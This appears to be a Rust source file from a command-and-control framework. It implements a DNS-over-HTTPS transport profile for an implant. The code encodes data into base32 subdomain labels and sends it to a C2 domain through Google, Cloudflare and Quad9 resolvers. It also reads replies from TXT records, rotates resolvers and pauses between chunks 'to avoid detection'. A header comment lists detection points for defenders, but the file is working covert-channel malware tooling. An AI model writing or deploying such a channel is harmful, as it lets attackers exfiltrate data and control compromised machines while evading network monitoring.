use crate::profiles::C2Profile;
use std::error::Error;

/// DNS over HTTPS C2 Profile
///
/// Encodes C2 traffic as DNS queries sent over HTTPS to public resolvers.
/// Data is encoded in subdomain labels, responses come via TXT records.
///
/// Detection points for defenders:
/// - Non-browser processes making DoH requests
/// - High-entropy subdomain queries
/// - Unusual TXT record query patterns
/// - Query volume/timing anomalies
pub struct DoHProfile {
    /// AES key for encrypted communications
    aes_key: Option<Vec<u8>>,
    /// C2 domain (authoritative DNS server)
    c2_domain: String,
    /// DoH resolver endpoints
    resolvers: Vec<String>,
    /// Current resolver index
    resolver_idx: usize,
    /// Transaction ID counter
    tx_id: u16,
}

impl DoHProfile {
    /// Create a new DoH C2 profile
    /// * `domain` - C2 domain with authoritative DNS server
    pub fn new(domain: &str) -> Self {
        let aes_key = profilevars::aes_key().map(|k| base64::decode(k).unwrap());

        Self {
            aes_key,
            c2_domain: domain.to_string(),
            resolvers: vec![
                "https://dns.google/dns-query".to_string(),
                "https://cloudflare-dns.com/dns-query".to_string(),
                "https://dns.quad9.net:5053/dns-query".to_string(),
            ],
            resolver_idx: 0,
            tx_id: rand::random(),
        }
    }

    /// Encode data as base32 for DNS-safe labels (no padding, lowercase)
    fn encode_label(data: &[u8]) -> String {
        const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";
        let mut result = String::new();
        let mut bits: u32 = 0;
        let mut bit_count: u32 = 0;

        for &byte in data {
            bits = (bits << 8) | byte as u32;
            bit_count += 8;
            while bit_count >= 5 {
                bit_count -= 5;
                let idx = ((bits >> bit_count) & 0x1F) as usize;
                result.push(ALPHABET[idx] as char);
            }
        }
        if bit_count > 0 {
            let idx = ((bits << (5 - bit_count)) & 0x1F) as usize;
            result.push(ALPHABET[idx] as char);
        }
        result
    }

    /// Decode base32 DNS label back to bytes
    fn decode_label(encoded: &str) -> Result<Vec<u8>, Box<dyn Error>> {
        let mut result = Vec::new();
        let mut bits: u32 = 0;
        let mut bit_count: u32 = 0;

        for c in encoded.chars() {
            let val = match c {
                'a'..='z' => c as u32 - 'a' as u32,
                '2'..='7' => c as u32 - '2' as u32 + 26,
                'A'..='Z' => c as u32 - 'A' as u32, // case insensitive
                _ => continue, // skip invalid chars
            };
            bits = (bits << 5) | val;
            bit_count += 5;
            if bit_count >= 8 {
                bit_count -= 8;
                result.push((bits >> bit_count) as u8);
            }
        }
        Ok(result)
    }

    /// Build a DNS query packet for TXT record
    fn build_dns_query(&mut self, name: &str) -> Vec<u8> {
        let mut packet = Vec::new();

        // Header (12 bytes)
        self.tx_id = self.tx_id.wrapping_add(1);
        packet.extend_from_slice(&self.tx_id.to_be_bytes()); // Transaction ID
        packet.extend_from_slice(&[0x01, 0x00]); // Flags: standard query, recursion desired
        packet.extend_from_slice(&[0x00, 0x01]); // QDCOUNT: 1 question
        packet.extend_from_slice(&[0x00, 0x00]); // ANCOUNT: 0
        packet.extend_from_slice(&[0x00, 0x00]); // NSCOUNT: 0
        packet.extend_from_slice(&[0x00, 0x00]); // ARCOUNT: 0

        // Question section: encode domain name
        for label in name.split('.') {
            if !label.is_empty() {
                packet.push(label.len() as u8);
                packet.extend_from_slice(label.as_bytes());
            }
        }
        packet.push(0x00); // Root label

        packet.extend_from_slice(&[0x00, 0x10]); // QTYPE: TXT (16)
        packet.extend_from_slice(&[0x00, 0x01]); // QCLASS: IN (1)

        packet
    }

    /// Parse DNS response and extract TXT record data
    fn parse_dns_response(&self, response: &[u8]) -> Result<String, Box<dyn Error>> {
        if response.len() < 12 {
            return Err("Response too short".into());
        }

        // Check response flags
        let flags = u16::from_be_bytes([response[2], response[3]]);
        let rcode = flags & 0x000F;
        if rcode != 0 {
            return Err(format!("DNS error: rcode {}", rcode).into());
        }

        let ancount = u16::from_be_bytes([response[6], response[7]]);
        if ancount == 0 {
            return Err("No answer records".into());
        }

        // Skip header and question section
        let mut pos = 12;

        // Skip question section (find the end)
        while pos < response.len() && response[pos] != 0 {
            let len = response[pos] as usize;
            if len >= 0xC0 {
                pos += 2; // Compression pointer
                break;
            }
            pos += len + 1;
        }
        if pos < response.len() && response[pos] == 0 {
            pos += 1; // null terminator
        }
        pos += 4; // QTYPE + QCLASS

        // Parse answer section
        let mut txt_data = String::new();
        for _ in 0..ancount {
            if pos >= response.len() {
                break;
            }

            // Skip name (handle compression)
            if response[pos] >= 0xC0 {
                pos += 2;
            } else {
                while pos < response.len() && response[pos] != 0 {
                    pos += response[pos] as usize + 1;
                }
                pos += 1;
            }

            if pos + 10 > response.len() {
                break;
            }

            let rtype = u16::from_be_bytes([response[pos], response[pos + 1]]);
            let rdlength = u16::from_be_bytes([response[pos + 8], response[pos + 9]]) as usize;
            pos += 10;

            if rtype == 16 && pos + rdlength <= response.len() {
                // TXT record - first byte is string length
                let mut txt_pos = pos;
                while txt_pos < pos + rdlength {
                    let str_len = response[txt_pos] as usize;
                    txt_pos += 1;
                    if txt_pos + str_len <= pos + rdlength {
                        if let Ok(s) = std::str::from_utf8(&response[txt_pos..txt_pos + str_len]) {
                            txt_data.push_str(s);
                        }
                    }
                    txt_pos += str_len;
                }
            }
            pos += rdlength;
        }

        Ok(txt_data)
    }

    /// Send DNS query via DoH and get response
    fn doh_query(&mut self, query: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
        let resolver = &self.resolvers[self.resolver_idx];

        // Send as POST with application/dns-message
        let response = minreq::post(resolver)
            .with_header("Content-Type", "application/dns-message")
            .with_header("Accept", "application/dns-message")
            .with_body(query.to_vec())
            .send()?;

        if response.status_code != 200 {
            // Rotate to next resolver on failure
            self.resolver_idx = (self.resolver_idx + 1) % self.resolvers.len();
            return Err(format!("DoH request failed: {}", response.status_code).into());
        }

        Ok(response.into_bytes())
    }

    /// Chunk data into DNS-safe labels (max 63 chars per label, ~250 total)
    fn chunk_data(&self, data: &str) -> Vec<String> {
        let encoded = Self::encode_label(data.as_bytes());
        let mut chunks = Vec::new();

        // Max label is 63 chars, use 60 for safety
        // Total domain max ~253 chars, leave room for c2_domain
        let max_label_len = 60;
        let max_labels = 3; // Use up to 3 data labels

        let mut remaining = encoded.as_str();
        let mut chunk_labels = Vec::new();

        while !remaining.is_empty() && chunk_labels.len() < max_labels {
            let split_at = remaining.len().min(max_label_len);
            chunk_labels.push(&remaining[..split_at]);
            remaining = &remaining[split_at..];
        }

        if !remaining.is_empty() {
            // Data too large for single query, need multiple
            let chars: Vec<char> = encoded.chars().collect();
            let chunk_size = max_label_len * max_labels;

            for (idx, chunk) in chars.chunks(chunk_size).enumerate() {
                let chunk_str: String = chunk.iter().collect();
                let mut labels: Vec<String> = chunk_str
                    .as_bytes()
                    .chunks(max_label_len)
                    .map(|c| String::from_utf8_lossy(c).to_string())
                    .collect();

                // Add sequence number
                labels.push(format!("c{}", idx));
                labels.push(self.c2_domain.clone());
                chunks.push(labels.join("."));
            }
        } else {
            // Single query fits
            let mut labels: Vec<String> = chunk_labels.iter().map(|s| s.to_string()).collect();
            labels.push("d".to_string()); // marker for data query
            labels.push(self.c2_domain.clone());
            chunks.push(labels.join("."));
        }

        chunks
    }
}

impl C2Profile for DoHProfile {
    fn get_aes_key(&self) -> Option<&Vec<u8>> {
        self.aes_key.as_ref()
    }

    fn set_aes_key(&mut self, new_key: Vec<u8>) {
        self.aes_key = Some(new_key);
    }

    fn c2send(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
        let chunks = self.chunk_data(data);
        let mut full_response = String::new();

        for (idx, query_name) in chunks.iter().enumerate() {
            // Build and send DNS query
            let query_packet = self.build_dns_query(query_name);
            let response_packet = self.doh_query(&query_packet)?;

            // Parse TXT record from response
            let txt_data = self.parse_dns_response(&response_packet)?;

            // Decode the response data
            if !txt_data.is_empty() {
                let decoded = Self::decode_label(&txt_data)?;
                if let Ok(s) = String::from_utf8(decoded) {
                    full_response.push_str(&s);
                }
            }

            // Small delay between chunks to avoid detection
            if idx < chunks.len() - 1 {
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
        }

        Ok(full_response)
    }
}

/// Configuration variables for DoH profile
pub mod profilevars {
    use serde::{Deserialize, Serialize};

    #[derive(Deserialize, Serialize)]
    struct Aespsk {
        value: String,
        enc_key: Option<String>,
        dec_key: Option<String>,
    }

    /// Get the C2 domain for DNS queries
    pub fn c2_domain() -> String {
        option_env!("doh_domain")
            .unwrap_or("c2.example.com")
            .to_string()
    }

    /// Get the configured AES key
    pub fn aes_key() -> Option<String> {
        if let Some(aes_str) = option_env!("AESPSK") {
            if let Ok(aes) = serde_json::from_str::<Aespsk>(aes_str) {
                return aes.enc_key;
            }
        }
        None
    }

    /// Get configured DoH resolvers (comma-separated)
    pub fn resolvers() -> Option<Vec<String>> {
        option_env!("doh_resolvers").map(|s| {
            s.split(',')
                .map(|r| r.trim().to_string())
                .filter(|r| !r.is_empty())
                .collect()
        })
    }
}
